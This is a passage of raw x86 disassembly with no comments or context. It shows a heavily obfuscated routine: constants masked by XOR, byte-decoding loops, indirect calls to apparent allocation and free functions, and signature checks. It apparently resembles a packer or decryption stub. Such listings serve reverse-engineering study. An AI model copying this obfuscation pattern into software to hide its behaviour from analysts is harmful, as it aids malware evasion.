  41d8ab:	add    ecx,DWORD PTR [ebp-0x28]
  41d8ae:	mov    eax,DWORD PTR [ebp-0x8]
  41d8b1:	cmp    eax,ecx
  41d8b3:	ja     0x41da18
  41d8b9:	mov    DWORD PTR [ebp-0x20],0x0
  41d8c0:	push   DWORD PTR [ebp+0x8]
  41d8c3:	mov    edi,DWORD PTR [ebp+0x8]
  41d8c6:	mov    eax,DWORD PTR [ebp+0x8]
  41d8c9:	mov    edx,DWORD PTR [eax+0x1b4]
  41d8cf:	call   0x41fafc
  41d8d4:	push   eax
  41d8d5:	mov    eax,DWORD PTR [ebp+0x8]
  41d8d8:	mov    eax,DWORD PTR [eax+0x1a8]
  41d8de:	push   DWORD PTR [eax]
  41d8e0:	call   0x41f79d
  41d8e5:	mov    ecx,DWORD PTR [ebp+0x8]
  41d8e8:	mov    ecx,DWORD PTR [ecx+0x19c]
  41d8ee:	mov    DWORD PTR [ecx],eax
  41d8f0:	mov    eax,DWORD PTR [ebp+0x8]
  41d8f3:	mov    edi,DWORD PTR [eax+0x1d8]
  41d8f9:	mov    esi,DWORD PTR [ebp+0x8]
  41d8fc:	xor    eax,eax
  41d8fe:	lea    edx,[ebp-0x7c]
  41d901:	call   0x41fb32
  41d906:	push   eax
  41d907:	mov    eax,DWORD PTR [ebp+0x8]
  41d90a:	mov    eax,DWORD PTR [eax+0x19c]
  41d910:	push   DWORD PTR [eax]
  41d912:	call   DWORD PTR [edi+0x8]
  41d915:	mov    DWORD PTR [ebp-0x24],eax
  41d918:	mov    eax,DWORD PTR [ebp+0x8]
  41d91b:	mov    edi,DWORD PTR [eax+0x1d8]
  41d921:	mov    esi,DWORD PTR [ebp+0x8]
  41d924:	xor    eax,eax
  41d926:	lea    edx,[ebp-0x90]
  41d92c:	call   0x41fb32
  41d931:	push   eax
  41d932:	mov    eax,DWORD PTR [ebp+0x8]
  41d935:	mov    eax,DWORD PTR [eax+0x19c]
  41d93b:	push   DWORD PTR [eax]
  41d93d:	call   DWORD PTR [edi+0x8]
  41d940:	and    DWORD PTR [ebp-0x1c],0x0
  41d944:	mov    eax,DWORD PTR [ebp-0x1c]
  41d947:	and    eax,0x7
  41d94a:	add    eax,0x31
  41d94d:	push   eax
  41d94e:	call   DWORD PTR [ebp-0x24]
  41d951:	test   eax,eax
  41d953:	jne    0x41d95a
  41d955:	and    DWORD PTR [ebp-0x10],eax
  41d958:	jmp    0x41d982
  41d95a:	mov    eax,DWORD PTR [ebp+0x8]
  41d95d:	mov    edi,DWORD PTR [eax+0x1d8]
  41d963:	mov    esi,DWORD PTR [ebp+0x8]
  41d966:	xor    eax,eax
  41d968:	lea    edx,[ebp-0x68]
  41d96b:	call   0x41fb32
  41d970:	push   eax
  41d971:	mov    eax,DWORD PTR [ebp+0x8]
  41d974:	mov    eax,DWORD PTR [eax+0x198]
  41d97a:	push   DWORD PTR [eax]
  41d97c:	call   DWORD PTR [edi+0x8]
  41d97f:	mov    DWORD PTR [ebp-0x10],eax
  41d982:	inc    DWORD PTR [ebp-0x1c]
  41d985:	cmp    DWORD PTR [ebp-0x1c],0x10
  41d989:	jb     0x41d944
  41d98b:	mov    eax,DWORD PTR [ebp-0x18]
  41d98e:	mov    esi,DWORD PTR [ebp+0x8]
  41d991:	xor    eax,ebx
  41d993:	mov    edi,0x3272e2
  41d998:	add    eax,edi
  41d99a:	lea    edx,[ebp-0xe4]
  41d9a0:	call   0x41fb32
  41d9a5:	push   eax
  41d9a6:	mov    eax,DWORD PTR [ebp-0x14]
  41d9a9:	mov    esi,DWORD PTR [ebp+0x8]
  41d9ac:	xor    eax,ebx
  41d9ae:	add    eax,edi
  41d9b0:	lea    edx,[ebp-0x104]
  41d9b6:	call   0x41fb32
  41d9bb:	push   eax
  41d9bc:	call   DWORD PTR [ebp-0x10]
  41d9bf:	mov    ecx,DWORD PTR [ebp-0x14]
  41d9c2:	xor    ecx,ebx
  41d9c4:	add    ecx,edi
  41d9c6:	cmp    ecx,eax
  41d9c8:	jne    0x41d9d1
  41d9ca:	mov    DWORD PTR [ebp-0x20],0x1
  41d9d1:	mov    eax,DWORD PTR [ebp-0x18]
  41d9d4:	mov    ecx,DWORD PTR [ebp-0x8]
  41d9d7:	xor    eax,ebx
  41d9d9:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9e0:	mov    DWORD PTR [ebp-0x8],eax
  41d9e3:	mov    eax,DWORD PTR [ebp-0x20]
  41d9e6:	test   eax,eax
  41d9e8:	je     0x41d9fc
  41d9ea:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ed:	mov    ecx,DWORD PTR [ebp-0x38]
  41d9f0:	xor    eax,ebx
  41d9f2:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9f9:	mov    DWORD PTR [ebp-0x38],eax
  41d9fc:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ff:	xor    eax,ebx
  41da01:	mov    ecx,0xffcd8d1e
  41da06:	sub    ecx,eax
  41da08:	add    ecx,DWORD PTR [ebp-0x28]
  41da0b:	mov    eax,DWORD PTR [ebp-0x8]
  41da0e:	cmp    eax,ecx
  41da10:	jbe    0x41d8b9
  41da16:	mov    esi,edi
  41da18:	mov    eax,DWORD PTR [ebp-0x38]
  41da1b:	mov    ecx,DWORD PTR [ebp-0x8]
  41da1e:	cmp    ecx,eax
  41da20:	jne    0x41da33
  41da22:	push   DWORD PTR [ebp+0x8]
  41da25:	lea    eax,[ebp-0x3c]
  41da28:	push   eax
  41da29:	call   0x4205aa
  41da2e:	mov    DWORD PTR [ebp-0x2c],eax
  41da31:	jmp    0x41da3f
  41da33:	mov    eax,DWORD PTR [ebp-0x2c]
  41da36:	mov    ecx,DWORD PTR [ebp-0x18]
  41da39:	xor    ecx,ebx
  41da3b:	add    ecx,esi
  41da3d:	xor    DWORD PTR [eax],ecx
  41da3f:	mov    eax,DWORD PTR [ebp-0x14]
  41da42:	mov    ecx,DWORD PTR [ebp-0x2c]
  41da45:	xor    eax,ebx
  41da47:	add    eax,esi
  41da49:	cmp    eax,ecx
  41da4b:	je     0x41e1c5
  41da51:	mov    eax,DWORD PTR [ebp-0x14]
  41da54:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da57:	xor    eax,ebx
  41da59:	add    eax,esi
  41da5b:	cmp    eax,ecx
  41da5d:	je     0x41e1c5
  41da63:	mov    eax,DWORD PTR [ebp-0x14]
  41da66:	xor    eax,ebx
  41da68:	add    eax,esi
  41da6a:	jmp    0x41da88
  41da6c:	mov    edi,DWORD PTR [ebp-0x2c]
  41da6f:	mov    cl,al
  41da71:	and    cl,0x1f
  41da74:	or     dl,0xff
  41da77:	sub    dl,cl
  41da79:	add    BYTE PTR [edi+eax*1],dl
  41da7c:	mov    ecx,DWORD PTR [ebp-0x18]
  41da7f:	xor    ecx,ebx
  41da81:	lea    eax,[eax+ecx*1+0x3272e2]
  41da88:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da8b:	cmp    eax,ecx
  41da8d:	jb     0x41da6c
  41da8f:	mov    eax,DWORD PTR [ebp-0x3c]
  41da92:	mov    DWORD PTR [ebp-0x28],eax
  41da95:	mov    eax,DWORD PTR [ebp-0x2c]
  41da98:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41da9f:	mov    DWORD PTR [ebp-0xbc],eax
  41daa5:	mov    edi,0xf89c8584
  41daaa:	mov    DWORD PTR [ebp-0x30],edi
  41daad:	mov    eax,DWORD PTR [ebp-0x38]
  41dab0:	xor    eax,ebx
  41dab2:	add    eax,esi
  41dab4:	mov    DWORD PTR [ebp-0xc],eax
  41dab7:	mov    eax,DWORD PTR [ebp-0x38]
  41daba:	xor    eax,ebx
  41dabc:	add    eax,esi
  41dabe:	mov    DWORD PTR [ebp-0x8],eax
  41dac1:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41dac8:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  41dacf:	mov    eax,DWORD PTR [ebp-0x38]
  41dad2:	mov    ecx,DWORD PTR [ebp-0x28]
  41dad5:	xor    eax,ebx
  41dad7:	add    eax,esi
  41dad9:	cmp    ecx,eax
  41dadb:	je     0x41dcda
  41dae1:	jmp    0x41dcb6
  41dae6:	mov    ecx,DWORD PTR [ebp-0xc]
  41dae9:	mov    eax,DWORD PTR [ebp-0x28]
  41daec:	sub    eax,ecx
  41daee:	mov    ecx,DWORD PTR [ebp-0x48]
  41daf1:	xor    ecx,ebx
  41daf3:	add    ecx,esi
  41daf5:	xor    edx,edx
  41daf7:	div    ecx
  41daf9:	mov    DWORD PTR [ebp-0x8],eax
  41dafc:	mov    eax,DWORD PTR [ebp-0x54]
  41daff:	mov    ecx,DWORD PTR [ebp-0x8]
  41db02:	xor    eax,ebx
  41db04:	add    eax,esi
  41db06:	cmp    ecx,eax
  41db08:	jbe    0x41db14
  41db0a:	mov    eax,DWORD PTR [ebp-0x54]
  41db0d:	xor    eax,ebx
  41db0f:	add    eax,esi
  41db11:	mov    DWORD PTR [ebp-0x8],eax
  41db14:	mov    eax,DWORD PTR [ebp-0x48]
  41db17:	mov    ecx,DWORD PTR [ebp-0x8]
  41db1a:	xor    eax,ebx
  41db1c:	add    eax,esi
  41db1e:	imul   eax,ecx
  41db21:	mov    DWORD PTR [ebp-0x8],eax
  41db24:	mov    eax,DWORD PTR [ebp-0x38]
  41db27:	mov    ecx,DWORD PTR [ebp-0x8]
  41db2a:	xor    eax,ebx
  41db2c:	add    eax,esi
  41db2e:	cmp    ecx,eax
  41db30:	je     0x41dca4
  41db36:	mov    eax,DWORD PTR [ebp-0x8]
  41db39:	mov    DWORD PTR [ebp-0x10],eax
  41db3c:	mov    eax,DWORD PTR [ebp-0xc]
  41db3f:	add    eax,DWORD PTR [ebp-0xbc]
  41db45:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  41db4c:	mov    DWORD PTR [ebp-0x20],edi
  41db4f:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  41db59:	mov    DWORD PTR [ebp-0x8],eax
  41db5c:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41db63:	mov    DWORD PTR [ebp-0x1c],edi
  41db66:	mov    eax,DWORD PTR [ebp-0x24]
  41db69:	xor    eax,ebx
  41db6b:	add    eax,esi
  41db6d:	jmp    0x41dc63
  41db72:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  41db7c:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  41db86:	mov    eax,DWORD PTR [ebp-0x1c]
  41db89:	mov    ecx,DWORD PTR [ebp-0x44]
  41db8c:	xor    eax,ebx
  41db8e:	add    eax,esi
  41db90:	imul   eax,ecx
  41db93:	mov    ecx,DWORD PTR [ebp-0x8]
  41db96:	mov    al,BYTE PTR [eax+ecx*1]
  41db99:	mov    BYTE PTR [ebp-0x2],al
  41db9c:	mov    eax,DWORD PTR [ebp-0x1c]
  41db9f:	mov    ecx,DWORD PTR [ebp-0x44]
  41dba2:	xor    eax,ebx
  41dba4:	add    eax,esi
  41dba6:	imul   eax,ecx
  41dba9:	mov    ecx,DWORD PTR [ebp-0xa8]
  41dbaf:	xor    ecx,ebx
  41dbb1:	add    eax,ecx
  41dbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbb6:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dbbe:	mov    ecx,DWORD PTR [ebp-0xb0]
  41dbc4:	xor    ecx,ebx
  41dbc6:	lea    eax,[ecx+eax*1+0x3272e2]
  41dbcd:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dbd1:	xor    ecx,eax
  41dbd3:	mov    BYTE PTR [ebp-0x2],cl
  41dbd6:	mov    al,BYTE PTR [ebp-0x2]
  41dbd9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dbdc:	mov    edx,DWORD PTR [ebp-0x44]
  41dbdf:	xor    ecx,ebx
  41dbe1:	add    ecx,esi
  41dbe3:	imul   ecx,edx
  41dbe6:	mov    edx,DWORD PTR [ebp-0x8]
  41dbe9:	mov    BYTE PTR [ecx+edx*1],al
  41dbec:	mov    eax,DWORD PTR [ebp-0x1c]
  41dbef:	mov    ecx,DWORD PTR [ebp-0x44]
  41dbf2:	xor    eax,ebx
  41dbf4:	add    eax,esi
  41dbf6:	imul   eax,ecx
  41dbf9:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbfc:	mov    al,BYTE PTR [eax+ecx*1]
  41dbff:	mov    BYTE PTR [ebp-0x2],al
  41dc02:	mov    eax,DWORD PTR [ebp-0x1c]
  41dc05:	mov    ecx,DWORD PTR [ebp-0x44]
  41dc08:	xor    eax,ebx
  41dc0a:	add    eax,esi
  41dc0c:	imul   eax,ecx
  41dc0f:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc12:	xor    ecx,ebx
  41dc14:	add    eax,ecx
  41dc16:	mov    ecx,DWORD PTR [ebp-0x8]
  41dc19:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dc21:	mov    ecx,DWORD PTR [ebp-0xb8]
  41dc27:	xor    ecx,ebx
  41dc29:	lea    eax,[ecx+eax*1+0x3272e2]
  41dc30:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dc34:	xor    ecx,eax
  41dc36:	mov    BYTE PTR [ebp-0x2],cl
  41dc39:	mov    al,BYTE PTR [ebp-0x2]
  41dc3c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dc3f:	mov    edx,DWORD PTR [ebp-0x44]
  41dc42:	xor    ecx,ebx
  41dc44:	add    ecx,esi
  41dc46:	imul   ecx,edx
  41dc49:	mov    edx,DWORD PTR [ebp-0x8]
  41dc4c:	mov    BYTE PTR [ecx+edx*1],al
  41dc4f:	mov    eax,DWORD PTR [ebp-0x34]
  41dc52:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc55:	xor    eax,ebx
  41dc57:	xor    ecx,ebx
  41dc59:	add    eax,esi
  41dc5b:	add    ecx,esi
  41dc5d:	imul   eax,ecx
  41dc60:	add    eax,DWORD PTR [ebp-0x44]
  41dc63:	mov    DWORD PTR [ebp-0x44],eax
  41dc66:	mov    eax,DWORD PTR [ebp-0x44]
  41dc69:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc6c:	cmp    ecx,eax
  41dc6e:	jb     0x41db72
  41dc74:	mov    eax,DWORD PTR [ebp-0x20]
  41dc77:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc7a:	xor    eax,ebx
  41dc7c:	add    eax,esi
  41dc7e:	imul   eax,ecx
  41dc81:	mov    ecx,DWORD PTR [ebp-0x24]
  41dc84:	xor    ecx,ebx
  41dc86:	add    ecx,esi
  41dc88:	or     eax,ecx
  41dc8a:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc8d:	xor    ecx,ebx
  41dc8f:	add    eax,ecx
  41dc91:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc94:	xor    ecx,ebx
  41dc96:	add    eax,ecx
  41dc98:	mov    ecx,DWORD PTR [ebp-0xc]
  41dc9b:	lea    eax,[eax+ecx*1+0x64e5c4]
  41dca2:	jmp    0x41dcb3
  41dca4:	mov    eax,DWORD PTR [ebp-0x30]
  41dca7:	mov    ecx,DWORD PTR [ebp-0xc]
  41dcaa:	xor    eax,ebx
  41dcac:	lea    eax,[eax+ecx*1+0x3272e2]
  41dcb3:	mov    DWORD PTR [ebp-0xc],eax
  41dcb6:	mov    eax,DWORD PTR [ebp-0x30]
  41dcb9:	xor    eax,ebx
  41dcbb:	mov    ecx,0xffcd8d1e
  41dcc0:	sub    ecx,eax
  41dcc2:	add    ecx,DWORD PTR [ebp-0x28]
  41dcc5:	mov    eax,DWORD PTR [ebp-0x30]
  41dcc8:	mov    edx,DWORD PTR [ebp-0xc]
  41dccb:	xor    eax,ebx
  41dccd:	add    eax,esi
  41dccf:	imul   eax,edx
  41dcd2:	cmp    eax,ecx
  41dcd4:	jbe    0x41dae6
  41dcda:	mov    eax,DWORD PTR [ebp-0x14]
  41dcdd:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dce0:	mov    eax,DWORD PTR [ebp+0x8]
  41dce3:	mov    edx,DWORD PTR [ebp-0x4c]
  41dce6:	mov    eax,DWORD PTR [eax+0x1d8]
  41dcec:	xor    edx,ebx
  41dcee:	add    edx,esi
  41dcf0:	push   edx
  41dcf1:	mov    edx,DWORD PTR [ebp-0x40]
  41dcf4:	xor    edx,ebx
  41dcf6:	add    edx,esi
  41dcf8:	push   edx
  41dcf9:	push   ecx
  41dcfa:	mov    DWORD PTR [ebp-0x34],ecx
  41dcfd:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd00:	xor    ecx,ebx
  41dd02:	add    ecx,esi
  41dd04:	push   ecx
  41dd05:	call   DWORD PTR [eax+0x14]
  41dd08:	mov    edi,eax
  41dd0a:	mov    eax,DWORD PTR [ebp-0x14]
  41dd0d:	xor    eax,ebx
  41dd0f:	add    eax,esi
  41dd11:	cmp    eax,edi
  41dd13:	je     0x41dd6e
  41dd15:	mov    eax,DWORD PTR [ebp-0x14]
  41dd18:	jmp    0x41dd3b
  41dd1a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41dd1d:	xor    eax,ebx
  41dd1f:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41dd26:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  41dd2d:	mov    ecx,DWORD PTR [ebp-0x18]
  41dd30:	xor    ecx,ebx
  41dd32:	lea    eax,[ecx+eax*1+0x3272e2]
  41dd39:	xor    eax,ebx
  41dd3b:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dd3e:	sub    ecx,esi
  41dd40:	xor    ecx,ebx
  41dd42:	cmp    eax,ecx
  41dd44:	jne    0x41dd1a
  41dd46:	mov    eax,DWORD PTR [ebp+0x8]
  41dd49:	mov    ecx,DWORD PTR [ebp-0x50]
  41dd4c:	mov    eax,DWORD PTR [eax+0x1d8]
  41dd52:	xor    ecx,ebx
  41dd54:	add    ecx,esi
  41dd56:	push   ecx
  41dd57:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd5a:	xor    ecx,ebx
  41dd5c:	add    ecx,esi
  41dd5e:	push   ecx
  41dd5f:	push   DWORD PTR [ebp-0x2c]
  41dd62:	call   DWORD PTR [eax+0x18]
  41dd65:	mov    eax,DWORD PTR [ebp-0x34]
  41dd68:	mov    DWORD PTR [ebp-0x2c],edi
  41dd6b:	mov    DWORD PTR [ebp-0x3c],eax
  41dd6e:	mov    eax,DWORD PTR [ebp-0x2c]
  41dd71:	mov    DWORD PTR [ebp-0x10],eax
  41dd74:	mov    eax,DWORD PTR [ebp-0x18]
  41dd77:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd7a:	xor    eax,ebx
  41dd7c:	add    eax,esi
  41dd7e:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  41dd85:	mov    DWORD PTR [ebp-0x58],0x27143f14
  41dd8c:	jmp    0x41ddbf
  41dd8e:	mov    edx,DWORD PTR [ebp-0x10]
  41dd91:	mov    edi,ecx
  41dd93:	xor    edi,ebx
  41dd95:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  41dd9c:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41dda4:	xor    cl,0x74
  41dda7:	sub    cl,0x8
  41ddaa:	movzx  ecx,cl
  41ddad:	cmp    edx,ecx
  41ddaf:	jne    0x41ddc9
  41ddb1:	mov    ecx,DWORD PTR [ebp-0x18]
  41ddb4:	xor    ecx,ebx
  41ddb6:	lea    ecx,[ecx+edi*1+0x3272e2]
  41ddbd:	xor    ecx,ebx
  41ddbf:	cmp    ecx,0xf89c85bd
  41ddc5:	jne    0x41dd8e
  41ddc7:	jmp    0x41ddd0
  41ddc9:	mov    eax,DWORD PTR [ebp-0x14]
  41ddcc:	xor    eax,ebx
  41ddce:	add    eax,esi
  41ddd0:	mov    ecx,DWORD PTR [ebp-0x14]
  41ddd3:	xor    ecx,ebx
  41ddd5:	add    ecx,esi
  41ddd7:	cmp    ecx,eax
  41ddd9:	je     0x41df4f
  41dddf:	mov    eax,DWORD PTR [ebp-0x10]
  41dde2:	mov    eax,DWORD PTR [eax+0x8]
  41dde5:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41ddec:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41ddf3:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  41ddfa:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41de01:	mov    DWORD PTR [ebp-0x20],eax
  41de04:	mov    eax,DWORD PTR [ebp+0x8]
  41de07:	mov    ecx,DWORD PTR [ebp-0x24]
  41de0a:	xor    ecx,ebx
  41de0c:	add    ecx,esi
  41de0e:	push   ecx
  41de0f:	mov    ecx,DWORD PTR [ebp-0x48]
  41de12:	mov    eax,DWORD PTR [eax+0x1d8]
  41de18:	xor    ecx,ebx
  41de1a:	add    ecx,esi
  41de1c:	push   ecx
  41de1d:	mov    ecx,DWORD PTR [ebp-0x40]
  41de20:	xor    ecx,ebx
  41de22:	add    ecx,esi
  41de24:	push   ecx
  41de25:	mov    ecx,DWORD PTR [ebp-0xc]
  41de28:	xor    ecx,ebx
  41de2a:	add    ecx,esi
  41de2c:	push   ecx
  41de2d:	call   DWORD PTR [eax+0x14]
  41de30:	mov    edi,eax
  41de32:	mov    eax,DWORD PTR [ebp+0x8]
  41de35:	mov    ecx,DWORD PTR [ebp-0x24]
  41de38:	mov    eax,DWORD PTR [eax+0x1d8]
  41de3e:	xor    ecx,ebx
  41de40:	add    ecx,esi
  41de42:	push   ecx
  41de43:	mov    ecx,DWORD PTR [ebp-0x48]
  41de46:	xor    ecx,ebx
  41de48:	add    ecx,esi
  41de4a:	push   ecx
  41de4b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de4e:	push   DWORD PTR [ebp-0x20]
  41de51:	xor    ecx,ebx
  41de53:	add    ecx,esi
  41de55:	push   ecx
  41de56:	call   DWORD PTR [eax+0x14]
  41de59:	mov    ecx,DWORD PTR [ebp-0xc]
  41de5c:	xor    ecx,ebx
  41de5e:	add    ecx,esi
  41de60:	mov    DWORD PTR [ebp-0x24],eax
  41de63:	cmp    ecx,edi
  41de65:	je     0x41e1f2
  41de6b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de6e:	xor    ecx,ebx
  41de70:	add    ecx,esi
  41de72:	cmp    ecx,eax
  41de74:	je     0x41e1f2
  41de7a:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  41de81:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41de88:	mov    ecx,DWORD PTR [ebp-0x40]
  41de8b:	xor    cl,0x9b
  41de8e:	sub    cl,0x1e
  41de91:	mov    BYTE PTR [edi],cl
  41de93:	mov    ecx,DWORD PTR [ebp-0xc]
  41de96:	xor    cl,0x9b
  41de99:	sub    cl,0x1e
  41de9c:	mov    BYTE PTR [edi+0x1],cl
  41de9f:	mov    ecx,DWORD PTR [ebp-0x4c]
  41dea2:	xor    cl,0x9b
  41dea5:	sub    cl,0x1e
  41dea8:	mov    BYTE PTR [edi+0x2],cl
  41deab:	and    DWORD PTR [ebp-0xb4],0x0
  41deb2:	and    DWORD PTR [ebp-0xa4],0x0
  41deb9:	lea    ecx,[ebp-0xa4]
  41debf:	push   ecx
  41dec0:	push   DWORD PTR [ebp-0x20]
  41dec3:	push   eax
  41dec4:	lea    eax,[ebp-0xb4]
  41deca:	push   eax
  41decb:	mov    eax,DWORD PTR [ebp-0x10]
  41dece:	push   DWORD PTR [eax+0xc]
  41ded1:	mov    eax,DWORD PTR [ebp-0x2c]
  41ded4:	add    eax,0x10
  41ded7:	push   eax
  41ded8:	push   edi
  41ded9:	call   0x41d223
  41dede:	mov    DWORD PTR [ebp-0x40],eax
  41dee1:	mov    eax,DWORD PTR [ebp+0x8]
  41dee4:	mov    ecx,DWORD PTR [ebp-0x50]
  41dee7:	mov    eax,DWORD PTR [eax+0x1d8]
  41deed:	xor    ecx,ebx
  41deef:	add    ecx,esi
  41def1:	push   ecx
  41def2:	mov    ecx,DWORD PTR [ebp-0xc]
  41def5:	xor    ecx,ebx
  41def7:	add    ecx,esi
  41def9:	push   ecx
  41defa:	push   edi
  41defb:	call   DWORD PTR [eax+0x18]
  41defe:	mov    eax,DWORD PTR [ebp-0x40]
  41df01:	add    eax,0xffcd8d1e
  41df06:	xor    eax,ebx
  41df08:	cmp    eax,0xf89c8585
  41df0d:	mov    eax,DWORD PTR [ebp+0x8]
  41df10:	mov    eax,DWORD PTR [eax+0x1d8]
  41df16:	mov    ecx,DWORD PTR [ebp-0x50]
  41df19:	jne    0x41df3c
  41df1b:	xor    ecx,ebx
  41df1d:	add    ecx,esi
  41df1f:	push   ecx
  41df20:	mov    ecx,DWORD PTR [ebp-0xc]
  41df23:	xor    ecx,ebx
  41df25:	add    ecx,esi
  41df27:	push   ecx
  41df28:	push   DWORD PTR [ebp-0x2c]
  41df2b:	call   DWORD PTR [eax+0x18]
  41df2e:	mov    eax,DWORD PTR [ebp-0x24]
  41df31:	mov    DWORD PTR [ebp-0x2c],eax
  41df34:	mov    eax,DWORD PTR [ebp-0x20]
  41df37:	mov    DWORD PTR [ebp-0x3c],eax
  41df3a:	jmp    0x41df4f
  41df3c:	xor    ecx,ebx
  41df3e:	add    ecx,esi
  41df40:	push   ecx
  41df41:	mov    ecx,DWORD PTR [ebp-0xc]
  41df44:	xor    ecx,ebx
  41df46:	add    ecx,esi
  41df48:	push   ecx
  41df49:	push   DWORD PTR [ebp-0x24]
  41df4c:	call   DWORD PTR [eax+0x18]
  41df4f:	mov    eax,DWORD PTR [ebp-0x3c]
  41df52:	mov    DWORD PTR [ebp-0x38],eax
  41df55:	mov    eax,DWORD PTR [ebp-0x2c]
  41df58:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  41df5f:	mov    DWORD PTR [ebp-0x40],eax
  41df62:	mov    edi,0xf89c8584
  41df67:	mov    DWORD PTR [ebp-0x30],edi
  41df6a:	mov    eax,DWORD PTR [ebp-0x28]
  41df6d:	xor    eax,ebx
  41df6f:	add    eax,esi
  41df71:	mov    DWORD PTR [ebp-0xc],eax
  41df74:	mov    eax,DWORD PTR [ebp-0x28]
  41df77:	xor    eax,ebx
  41df79:	add    eax,esi
  41df7b:	mov    DWORD PTR [ebp-0x10],eax
  41df7e:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41df85:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  41df8c:	mov    eax,DWORD PTR [ebp-0x28]
  41df8f:	mov    ecx,DWORD PTR [ebp-0x38]
  41df92:	xor    eax,ebx
  41df94:	add    eax,esi
  41df96:	cmp    ecx,eax
  41df98:	je     0x41e18e
  41df9e:	jmp    0x41e16a
  41dfa3:	mov    ecx,DWORD PTR [ebp-0xc]
  41dfa6:	mov    eax,DWORD PTR [ebp-0x38]
  41dfa9:	sub    eax,ecx
  41dfab:	mov    ecx,DWORD PTR [ebp-0x48]
  41dfae:	xor    ecx,ebx
  41dfb0:	add    ecx,esi
  41dfb2:	xor    edx,edx
  41dfb4:	div    ecx
  41dfb6:	mov    DWORD PTR [ebp-0x10],eax
  41dfb9:	mov    eax,DWORD PTR [ebp-0x24]
  41dfbc:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfbf:	xor    eax,ebx
  41dfc1:	add    eax,esi
  41dfc3:	cmp    ecx,eax
  41dfc5:	jbe    0x41dfd1
  41dfc7:	mov    eax,DWORD PTR [ebp-0x24]
  41dfca:	xor    eax,ebx
  41dfcc:	add    eax,esi
  41dfce:	mov    DWORD PTR [ebp-0x10],eax
  41dfd1:	mov    eax,DWORD PTR [ebp-0x48]
  41dfd4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfd7:	xor    eax,ebx
  41dfd9:	add    eax,esi
  41dfdb:	imul   eax,ecx
  41dfde:	mov    DWORD PTR [ebp-0x10],eax
  41dfe1:	mov    eax,DWORD PTR [ebp-0x28]
  41dfe4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfe7:	xor    eax,ebx
  41dfe9:	add    eax,esi
  41dfeb:	cmp    ecx,eax
  41dfed:	je     0x41e158
  41dff3:	mov    eax,DWORD PTR [ebp-0x10]
  41dff6:	mov    DWORD PTR [ebp-0x20],eax
  41dff9:	mov    eax,DWORD PTR [ebp-0xc]
  41dffc:	add    eax,DWORD PTR [ebp-0x40]
  41dfff:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41e006:	mov    DWORD PTR [ebp-0x10],edi
  41e009:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41e010:	mov    DWORD PTR [ebp-0x1c],eax
  41e013:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41e01a:	mov    DWORD PTR [ebp-0x8],edi
  41e01d:	mov    eax,DWORD PTR [ebp-0x54]
  41e020:	xor    eax,ebx
  41e022:	add    eax,esi
  41e024:	jmp    0x41e117
  41e029:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  41e033:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  41e03d:	mov    eax,DWORD PTR [ebp-0x8]
  41e040:	mov    ecx,DWORD PTR [ebp-0x18]
  41e043:	xor    eax,ebx
  41e045:	add    eax,esi
  41e047:	imul   eax,ecx
  41e04a:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e04d:	mov    al,BYTE PTR [eax+ecx*1]
  41e050:	mov    BYTE PTR [ebp-0x1],al
  41e053:	mov    eax,DWORD PTR [ebp-0x8]
  41e056:	mov    ecx,DWORD PTR [ebp-0x18]
  41e059:	xor    eax,ebx
  41e05b:	add    eax,esi
  41e05d:	imul   eax,ecx
  41e060:	mov    ecx,DWORD PTR [ebp-0x4c]
  41e063:	xor    ecx,ebx
